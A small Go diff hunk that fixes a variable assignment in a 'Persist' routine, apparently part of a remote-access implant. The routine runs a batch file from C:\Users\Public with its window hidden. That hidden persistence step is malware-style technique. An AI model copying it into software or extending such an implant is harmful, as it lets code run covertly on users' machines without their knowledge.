@@ -55,7 +55,7 @@ func (p Persist) Run(clientID string, jobID string, args []string) (string, erro
 		PERSIST.Close()
 		Exec := exec.Command("cmd", "/C", "C:\\Users\\Public\\build.bat")
 		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		err := Exec.Run()
+		err = Exec.Run()
 		if err != nil {
 			return "", err
 		}
